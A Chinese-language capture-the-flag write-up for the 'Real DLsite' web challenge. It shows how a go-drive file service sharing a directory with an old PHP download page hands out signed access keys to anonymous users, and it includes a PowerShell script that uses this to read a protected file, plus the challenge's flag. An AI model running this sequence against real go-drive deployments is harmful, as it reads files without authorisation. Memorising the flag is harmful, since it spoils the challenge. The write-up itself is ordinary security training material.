# Real DLsite Writeup

## 题目信息

- 题目地址：`http://web-94cf11f5b3.adworld.xctf.org.cn:80/`
- 目标：获取 flag
- Flag：`ACTF{d0_an_Upgra3e_1n_s0m3_cases_tDUgp8JNKA}`

## 入口探测

访问首页可以看到两个入口：

```html
Your site is working normally! Access data at <a href="/data/">/data</a>, or new site at <a href="/new/#/_/test">/new</a>
```

其中：

- `/data/` 是一个旧的 PHP 文件下载服务；
- `/new/` 是 `go-drive` 前端，后端 API 路径同样挂在 `/new` 下。

访问 `/data/` 能看到目录列表，里面有一个 45 bytes 的文件 `f`：

```text
Directory path: /data/
Number of items: 5

f                  45 bytes
hello.txt           6 bytes
index.cgi         641 bytes
...
```

直接访问 `/data/f` 只会进入旧下载服务的文件详情页，不会直接返回文件内容。因此继续看源码和新服务。

## 源码分析

`Dockerfile` 里有几个关键点：

```dockerfile
ln -s /app/data/local/test dl/data

sqlite3 "${DB}" <<'SQL'
INSERT INTO drives(name, enabled, type, config)
SELECT 'test', 1, 'fs', '{"path":"test"}'
...
SQL

ProxyPass /new http://127.0.0.1:8089/new
```

也就是说：

- 旧服务 `/data/` 实际指向 `/app/data/local/test`；
- 新服务 `go-drive` 里有一个名为 `test` 的 fs drive；
- `/new/entries/test` 对应的也是同一个目录。

查看 `go-drive` 的路由，匿名用户可以先调用 `/auth/init` 获取 session token：

```go
r.POST("/auth/init", ar.init)
```

文件列表接口会给每个 entry 返回一个 `accessKey`：

```go
meta["accessKey"] = MakeSignature(dr.signer, e.Path(), s.User.Username, dr.config.SignatureTTL)
```

文件内容接口使用签名参数校验，参数名是 `_k`：

```go
const SignatureQueryKey = "_k"

signatureAuthRoute.GET("/content/*path", dr._getDrive, dr.getContent)
```

因此利用思路很直接：匿名登录后列目录，取 `f` 的 `accessKey`，再访问 `/new/content/test/f?_k=...`。

## 利用过程

PowerShell 复现：

```powershell
$base = 'http://web-94cf11f5b3.adworld.xctf.org.cn:80'

$token = (Invoke-RestMethod -Method POST "$base/new/auth/init").token
$headers = @{ Authorization = $token }

$entries = Invoke-RestMethod -Uri "$base/new/entries/test" -Headers $headers
$key = ($entries | Where-Object { $_.name -eq 'f' }).meta.accessKey

Invoke-WebRequest `
  -Uri "$base/new/content/test/f?_k=$([uri]::EscapeDataString($key))" `
  -UseBasicParsing |
  Select-Object -ExpandProperty Content
```

返回：

```text
ACTF{d0_an_Upgra3e_1n_s0m3_cases_tDUgp8JNKA}
```

## 小结

这题的关键不是在旧 PHP 下载服务里强行构造下载 token，而是注意首页提示的升级版 `/new`。`/data/` 和 `go-drive` 的 `test` drive 指向同一目录，旧服务只展示文件详情，新服务会在目录枚举时下发可用于读取文件内容的签名 `accessKey`。用正确的参数名 `_k` 带上这个签名即可读取 `test/f`，拿到 flag。
